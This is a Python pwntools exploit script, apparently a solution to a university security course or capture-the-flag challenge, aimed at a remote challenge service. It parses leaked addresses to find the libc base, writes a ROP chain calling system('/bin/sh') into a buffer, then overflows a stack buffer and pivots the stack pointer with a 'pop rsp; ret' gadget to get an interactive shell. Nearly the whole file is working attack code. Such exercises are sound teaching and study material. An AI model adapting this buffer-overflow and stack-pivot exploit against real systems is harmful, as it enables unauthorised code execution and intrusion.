#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33591)
#conn = pwn.process([exe.path])


#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

message1 = conn.recvline()
printf_address = int(message1[-13:-1],16)
libc_base = printf_address - libc.symbols['printf']
libc.address = libc_base
print(hex(libc_base))

message2 = conn.recvline()
buf1_address = int(message2[-13:-1], 16)
print(hex(buf1_address))

# setup big buf1 first to do acutal exploit
rop = pwn.ROP(libc)
#rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

conn.recvuntil(b'Prepare your vine swing location:\n')
conn.sendline(rop.chain())

# we know location of big buf2, let's move execution (ROP chain) there, by changing rsp
# program calls leave; ret; 
#   = mov rsp, rbp
#     pop rbp
#     ret (to pop rsp; ret)
# => we just override return address with gadget address and right after the new desired rsp location

gadget_offset = 0x000000000002746a # pop rsp; ret; 
gadget = libc_base + gadget_offset

new_rbp = buf1_address # note: rbp could be arbitrary (we just also set to buf1_address for fun)
payload = b'A'*32 + pwn.p64(new_rbp) + pwn.p64(gadget) + pwn.p64(buf1_address) # we pop the buf1_address into the rsp

conn.recvuntil(b'Now swing to it:\n')
conn.sendline(payload)

conn.interactive()